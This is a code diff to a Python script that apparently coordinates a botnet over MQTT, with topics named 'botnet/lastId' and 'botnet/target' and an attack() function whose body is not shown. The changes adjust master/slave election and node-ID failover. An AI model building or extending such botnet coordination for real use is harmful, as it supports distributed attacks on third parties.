@@ -21,7 +21,7 @@ def on_messagem(client, userdata, msg):
     print(msg.topic+" "+str(msg.payload))
     print(" ")
     received=1
-    if(msg.topic=="botnet/lastId" and lastId!=int(msg.payload)):
+    if(msg.topic=="botnet/lastId" and lastId<int(msg.payload)):
         lastId=int(msg.payload)
         print("New local last id:",lastId)
     if(msg.topic=="botnet/target"):
@@ -69,8 +69,7 @@ def attack():
         #delay
 
 def slave():
-    global client
-    global nodeId
+    global client,nodeId
     print("I'm slave")
     client.on_connect = on_connectsc
     client.on_message = on_messagesc
@@ -83,11 +82,10 @@ def slave():
         if(int((time.time()-startTime)%60%2)==0):
             startTime=time.time()
             if (not isReceived()):
+                nodeId-=1
                 master()
 def master():
-    global client
-    global nodeId
-    global lastId
+    global client,nodeId,lastId
     print("No alive nodes, i'll be the master one")
     client.on_connect = on_connectm
     client.on_message = on_messagem
@@ -112,7 +110,7 @@ def master():
             print("Last id:",lastId)
             print(ret)
 def common():
-    global client
+    global client, nodeId, lastId
     def setNodeId(newLastId):
         global nodeId
         nodeId=newLastId
@@ -134,10 +132,13 @@ def common():
             
             if(nodeId==-1 and isReceived()):   
                 setNodeId(lastId+1)
+            if(not isReceived() and nodeId==-1):
+                master()
             if(isReceived()):
                 received=0
-            else:
+            else:    #No se recupera el slave después de caído el master
                 nodeId-=1
+                lastId-=1
 ##            if(not isReceived()and ):
 ##                master()
 ##                #client.loop_stop()
